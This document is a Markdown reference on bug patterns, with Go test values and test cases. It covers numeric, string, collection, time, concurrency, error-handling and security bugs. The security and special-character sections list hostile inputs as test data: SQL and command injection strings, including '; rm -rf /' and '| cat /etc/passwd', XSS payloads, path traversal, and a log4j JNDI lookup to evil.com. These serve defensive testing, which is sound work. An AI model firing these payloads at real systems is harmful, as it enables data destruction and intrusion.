# Bug Patterns Reference

Common bug types and how to test for them systematically.

## Numeric Bugs

### Off-By-One Errors (OBOE)

**What:** Loop bounds, array indices, or comparisons off by one.

**Where to look:**
- Loop conditions (`<` vs `<=`)
- Array/slice indexing
- Range calculations
- Pagination

**Test values:**
```
For range [min, max]:
- min - 1 (before start)
- min     (at start)
- min + 1 (after start)
- max - 1 (before end)
- max     (at end)
- max + 1 (after end)
```

**Example:**
```go
// Bug: processes one too few items
for i := 0; i < len(items)-1; i++ { ... }

// Test cases:
tests := []struct {
    name  string
    items []int
    want  int
}{
    {"empty slice", []int{}, 0},
    {"single item", []int{1}, 1},
    {"two items", []int{1, 2}, 2},
    {"boundary", []int{1, 2, 3}, 3},
}
```

### Integer Overflow/Underflow

**What:** Arithmetic exceeds type limits, causing wraparound.

**Test values:**
```go
// For int32:
math.MaxInt32      // 2147483647
math.MaxInt32 - 1  // near overflow
math.MinInt32      // -2147483648
math.MinInt32 + 1  // near underflow

// For operations:
a + b where a = MaxInt and b > 0
a * b where result exceeds range
a - b where b > a (for unsigned)
```

**Example:**
```go
func TestMultiply_Overflow(t *testing.T) {
    tests := []struct {
        a, b    int32
        wantErr bool
    }{
        {100, 200, false},
        {math.MaxInt32, 2, true},
        {math.MaxInt32/2 + 1, 2, true},
        {-math.MaxInt32, -1, true}, // overflow on negation
    }
}
```

### Floating-Point Precision

**What:** Precision loss, comparison errors, special values.

**Test values:**
```go
// Precision issues
0.1 + 0.2         // ≠ 0.3 exactly
1e15 + 1          // may lose the 1

// Special values
math.NaN()
math.Inf(1)       // +∞
math.Inf(-1)      // -∞
0.0
-0.0              // distinct from +0.0

// Comparison
1e-10 vs 1e-11    // nearly equal
```

**Example:**
```go
const epsilon = 1e-9

func almostEqual(a, b float64) bool {
    return math.Abs(a-b) < epsilon
}

tests := []struct {
    a, b   float64
    equal  bool
}{
    {0.1 + 0.2, 0.3, true},
    {1e-10, 1e-11, false},
    {math.NaN(), math.NaN(), false}, // NaN != NaN
}
```

### Division Issues

**What:** Division by zero, integer truncation.

**Test values:**
```go
// Division by zero
x / 0     // panic for int, ±Inf for float

// Integer truncation
7 / 3     // = 2, not 2.33...
-7 / 3    // = -2 in Go (truncates toward zero)

// Modulo with negative
-7 % 3    // = -1 in Go
```

## String Bugs

### Empty and Nil Strings

**Test values:**
```go
""          // empty string
"   "       // whitespace only
"\t\n"      // invisible chars
nil         // for *string or optional

// Length edge cases
""          // len = 0
"a"         // len = 1
strings.Repeat("a", 1000000) // very long
```

### Unicode and Encoding

**Test values:**
```go
// Multi-byte characters
"日本語"            // 3 characters, 9 bytes
"café"              // combining character
"👨‍👩‍👧‍👦"              // family emoji (complex)

// Boundary characters
"\x00"              // null byte
"\uFFFD"            // replacement character
"\uFEFF"            // BOM

// Normalization
"é" vs "é"          // composed vs decomposed
```

**Example:**
```go
tests := []struct {
    input  string
    length int // character count, not bytes
}{
    {"hello", 5},
    {"日本語", 3},        // 3 runes
    {"café", 4},          // with combining
    {"👨‍👩‍👧", 1},            // family as 1 grapheme
}

for _, tc := range tests {
    got := utf8.RuneCountInString(tc.input)
    // Note: grapheme clusters need special handling
}
```

### Special Characters

**Test values:**
```go
// Injection risks
"<script>alert(1)</script>"   // XSS
"'; DROP TABLE users; --"     // SQL injection
"../../../etc/passwd"         // path traversal

// Format strings
"%s%s%s%s%s"                  // format string attack
"${jndi:ldap://evil.com/a}"   // log4j style

// Control characters
"\n\r\t"                      // whitespace
"\x1b[31m"                    // ANSI escape
"\x00"                        // null terminator
```

## Collection Bugs

### Empty and Nil Collections

**Test values:**
```go
// Slices
var nilSlice []int       // nil
emptySlice := []int{}    // empty but not nil
singleItem := []int{1}   // one element

// Maps
var nilMap map[string]int    // nil
emptyMap := map[string]int{} // empty but not nil

// Arrays
[0]int{}    // zero-length array
[1]int{0}   // single element
```

**Important distinctions:**
```go
func TestNilVsEmpty(t *testing.T) {
    var nilSlice []int
    emptySlice := []int{}

    // Both have len 0
    if len(nilSlice) != 0 || len(emptySlice) != 0 {
        t.Error("length should be 0")
    }

    // But they're not equal
    if nilSlice == nil && emptySlice != nil {
        // This is expected
    }

    // JSON encoding differs
    // nilSlice -> null
    // emptySlice -> []
}
```

### Index and Range Errors

**Test values:**
```go
items := []int{1, 2, 3}

// Index access
items[-1]           // panic
items[0]            // first
items[len(items)-1] // last
items[len(items)]   // panic

// Slicing
items[0:0]          // empty slice
items[0:1]          // first element
items[1:3]          // middle to end
items[3:3]          // empty at end
items[3:4]          // panic
```

### Concurrent Access

**Test patterns:**
```go
// Race condition detection
func TestConcurrentMap(t *testing.T) {
    m := make(map[int]int)
    var wg sync.WaitGroup

    for i := 0; i < 100; i++ {
        wg.Add(2)
        go func(i int) {
            defer wg.Done()
            m[i] = i // Write
        }(i)
        go func(i int) {
            defer wg.Done()
            _ = m[i] // Read
        }(i)
    }
    wg.Wait()
    // Run with -race flag
}
```

## Time and Date Bugs

### Time Zone Issues

**Test values:**
```go
// Edge cases
time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC)  // UTC
time.Date(2024, 1, 1, 0, 0, 0, 0, time.Local) // local

// DST transitions (location-dependent)
// Spring forward: 2:00 AM -> 3:00 AM (hour 2 doesn't exist)
// Fall back: 2:00 AM occurs twice

// Time zones with offsets
time.FixedZone("IST", 5*60*60+30*60) // +05:30
```

### Calendar Edge Cases

**Test values:**
```go
// Month boundaries
time.Date(2024, 1, 31, 0, 0, 0, 0, time.UTC)  // Jan 31
time.Date(2024, 2, 29, 0, 0, 0, 0, time.UTC)  // Feb 29 (leap year)
time.Date(2023, 2, 29, 0, 0, 0, 0, time.UTC)  // normalizes to Mar 1

// Year boundaries
time.Date(2024, 12, 31, 23, 59, 59, 0, time.UTC)
time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)

// Epoch and extremes
time.Unix(0, 0)              // 1970-01-01
time.Date(1, 1, 1, 0, 0, 0, 0, time.UTC) // Go zero time
```

### Duration Edge Cases

**Test values:**
```go
0 * time.Second          // zero duration
1 * time.Nanosecond      // minimum positive
-1 * time.Hour           // negative duration
time.Duration(math.MaxInt64) // max duration
```

## Resource Bugs

### Memory Leaks

**Patterns to test:**
```go
// Goroutine leaks
func TestNoGoroutineLeak(t *testing.T) {
    before := runtime.NumGoroutine()

    // Run code that creates goroutines
    runOperation()

    time.Sleep(100 * time.Millisecond) // Allow cleanup
    after := runtime.NumGoroutine()

    if after > before {
        t.Errorf("goroutine leak: before=%d after=%d", before, after)
    }
}

// Slice capacity growth
func TestSliceGrowth(t *testing.T) {
    var slice []int
    for i := 0; i < 1000000; i++ {
        slice = append(slice, i)
    }
    // Check memory usage is reasonable
}
```

### File Handle Leaks

**Test pattern:**
```go
func TestFileHandleClosed(t *testing.T) {
    f, err := processFile("test.txt")
    if err != nil {
        t.Fatal(err)
    }

    // Verify file is closed
    _, err = f.Read(make([]byte, 1))
    if !errors.Is(err, os.ErrClosed) {
        t.Error("file should be closed")
    }
}
```

### Connection Leaks

**Test pattern:**
```go
func TestConnectionPooling(t *testing.T) {
    db := setupDB()
    initialConns := db.Stats().OpenConnections

    for i := 0; i < 100; i++ {
        rows, _ := db.Query("SELECT 1")
        rows.Close() // Must close!
    }

    finalConns := db.Stats().OpenConnections
    if finalConns > initialConns+5 {
        t.Errorf("connection leak: %d -> %d", initialConns, finalConns)
    }
}
```

## Concurrency Bugs

### Race Conditions

**Detection:**
```bash
go test -race ./...
```

**Common patterns:**
```go
// Shared state without synchronization
var counter int
go func() { counter++ }()
go func() { counter++ }()

// Check-then-act (TOCTOU)
if file.Exists(path) {
    file.Delete(path) // May fail if deleted between check and act
}

// Unprotected map access
m := make(map[int]int)
go func() { m[1] = 1 }()
go func() { _ = m[1] }()
```

### Deadlocks

**Test pattern:**
```go
func TestNoDeadlock(t *testing.T) {
    done := make(chan bool)
    go func() {
        // Run operation that might deadlock
        operation()
        done <- true
    }()

    select {
    case <-done:
        // Success
    case <-time.After(5 * time.Second):
        t.Fatal("timeout - possible deadlock")
    }
}
```

### Channel Issues

**Test values:**
```go
// Nil channel
var nilChan chan int
// <- nilChan  // blocks forever
// nilChan <- 1 // blocks forever
// close(nilChan) // panic

// Closed channel
closedChan := make(chan int)
close(closedChan)
// <- closedChan  // returns zero value, false
// closedChan <- 1 // panic
// close(closedChan) // panic

// Unbuffered vs buffered
unbuf := make(chan int)      // blocks on send until receive
buf := make(chan int, 1)     // doesn't block first send
```

## Error Handling Bugs

### Missing Error Checks

**What to test:**
```go
// Function returns error
result, _ := riskyOperation() // Bug: ignoring error

// Test that errors are propagated
func TestErrorPropagation(t *testing.T) {
    _, err := operationWithForcedError()
    if err == nil {
        t.Error("expected error to propagate")
    }
}
```

### Error Wrapping

**Test pattern:**
```go
func TestErrorWrapping(t *testing.T) {
    err := operation()

    // Check unwrapping
    if !errors.Is(err, ErrNotFound) {
        t.Errorf("error should wrap ErrNotFound")
    }

    // Check error chain
    var targetErr *CustomError
    if !errors.As(err, &targetErr) {
        t.Errorf("error should be unwrappable to CustomError")
    }
}
```

### Panic Recovery

**Test pattern:**
```go
func TestPanicRecovery(t *testing.T) {
    defer func() {
        if r := recover(); r == nil {
            t.Error("expected panic")
        }
    }()

    functionThatShouldPanic()
}

func TestNoPanic(t *testing.T) {
    defer func() {
        if r := recover(); r != nil {
            t.Errorf("unexpected panic: %v", r)
        }
    }()

    functionThatShouldNotPanic()
}
```

## Security Bugs

### Input Validation

**Test values:**
```go
// SQL injection
"'; DROP TABLE users; --"
"1 OR 1=1"
"admin'--"

// XSS
"<script>alert(1)</script>"
"<img src=x onerror=alert(1)>"
"javascript:alert(1)"

// Path traversal
"../../../etc/passwd"
"..\\..\\..\\windows\\system32"
"%2e%2e%2f" // URL encoded

// Command injection
"; rm -rf /"
"| cat /etc/passwd"
"$(whoami)"
"`id`"

// Header injection
"value\r\nX-Injected: header"
"value\nSet-Cookie: malicious=true"
```

### Authentication/Authorization

**Test cases:**
```go
tests := []struct {
    name       string
    user       string
    role       string
    resource   string
    wantAccess bool
}{
    // Positive cases
    {"admin can access admin page", "admin", "admin", "/admin", true},
    {"user can access own profile", "user1", "user", "/profile/user1", true},

    // Negative cases
    {"user cannot access admin page", "user1", "user", "/admin", false},
    {"user cannot access other profile", "user1", "user", "/profile/user2", false},
    {"anonymous cannot access protected", "", "anon", "/dashboard", false},

    // Edge cases
    {"expired token", "user1", "expired", "/dashboard", false},
    {"invalid token format", "user1", "invalid", "/dashboard", false},
}
```

### Cryptography

**What to test:**
- Correct algorithm usage
- Proper key lengths
- IV/nonce uniqueness
- Timing attack resistance (constant-time comparison)

```go
func TestConstantTimeCompare(t *testing.T) {
    secret := []byte("supersecret")
    guess1 := []byte("supersecret") // correct
    guess2 := []byte("xupersecret") // wrong first char
    guess3 := []byte("supersecrex") // wrong last char

    // All comparisons should take similar time
    // Use subtle.ConstantTimeCompare
    if subtle.ConstantTimeCompare(secret, guess1) != 1 {
        t.Error("should match")
    }
}
```

## Bug Checklist by Feature Type

### For API Endpoints
- [ ] Invalid/missing authentication
- [ ] Authorization bypass
- [ ] Input validation (all parameters)
- [ ] Rate limiting
- [ ] Error message exposure
- [ ] HTTP method restrictions

### For Data Processing
- [ ] Empty/null input
- [ ] Malformed input
- [ ] Very large input
- [ ] Unicode handling
- [ ] Concurrent processing
- [ ] Partial failure handling

### For State Machines
- [ ] All valid transitions
- [ ] Invalid transitions rejected
- [ ] Boundary states (initial, terminal)
- [ ] Concurrent state changes
- [ ] Recovery from failed transitions

### For Calculations
- [ ] Boundary values
- [ ] Zero/negative inputs
- [ ] Overflow/underflow
- [ ] Precision loss
- [ ] Division by zero
- [ ] Order of operations
